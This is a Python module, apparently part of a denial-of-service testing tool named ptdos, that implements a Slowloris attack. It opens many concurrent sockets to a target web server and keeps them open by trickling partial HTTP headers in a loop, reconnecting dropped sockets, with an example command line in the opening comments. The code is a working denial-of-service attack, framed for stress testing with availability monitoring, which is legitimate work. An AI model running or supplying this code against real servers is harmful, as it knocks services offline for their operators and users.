"""ptdos extension that adds a Slowloris attack."""
# watch -n 1 "netstat -ntu | awk '{print \$5}' | cut -d: -f1 | sort | uniq -c | sort -n"
# python3 ptdos.py -a slowloris -d 5 -dst http://192.168.0.80 -dp 80 -sq 10 -st 10

# own libs
from infrastructure import factory
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from misc.globalfuncs import generate_string, load_user_agents, get_ip_from_dst, parse_url
from misc.pt_http import create_slowloris_socket
# external libs
from ptlibs.ptmisclib import out_if, out_ifnot, ptprint
from time import time, asctime, sleep
from socket import error
from dataclasses import dataclass


@dataclass
class Slowloris:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        dstport = args['dstport']
        socksquant = args['socksquant']
        sleeptime = args['sleeptime']
        url = parse_url(dst)
        dst_ip = get_ip_from_dst(url.hostname)

        # initialize ua and langs
        my_user_agents, my_accept_lang = load_user_agents()

        ptprint(out_ifnot(f"Creating {socksquant} concurrent sockets.", "INFO", use_json))
        # create sockets first
        sockets_list = [create_slowloris_socket(dst_ip, dstport, my_user_agents, my_accept_lang, self.name) for _ in range(socksquant)]
        ptprint(out_ifnot(f"Sockets created.", "INFO", use_json))

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    monitoringprocess()  # stop checkservice end monitoring
                    att_end_t_asc = asctime()  # save attack's ending time
                    sleep(1)  # wait for 1 second to stop the monitoring process
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break
                # do the Slowloris attack
                sleep(sleeptime)
                for socket_item in sockets_list:
                    try:
                        socket_item.sendall(f"X-a: {generate_string(4)}\r\n".encode("utf-8"))
                    except Exception:
                        sockets_list.remove(socket_item)
                        sock = create_slowloris_socket(dst_ip, dstport, my_user_agents, my_accept_lang, self.name)
                        sockets_list.append(sock)
                for _ in range(socksquant - len(sockets_list)):
                    try:
                        sock = create_slowloris_socket(dst_ip, dstport, my_user_agents, my_accept_lang, self.name)
                        if sock:
                            sockets_list.append(sock)
                    except error:
                        break
            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, socksquant, dstport)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"Slowloris attack options": [
                ["-a", "--attack", "<attack>", "Attack name - slowloris"],
                ["-d", "--duration", "<duration>", "Attack duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "Specify destination URL."],
                ["-dp", "--dstport", "<dstport>", "Specify destination port. Default 80."],
                ["-sq", "--socksquant", "<socksquant>", "Number of concurrent sockets opened. Default 10 sockets."],
                ["-st", "--sleep-time", "<sleeptime>", "Time between keepalive http requests. Default 0 seconds."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("slowloris", Slowloris)
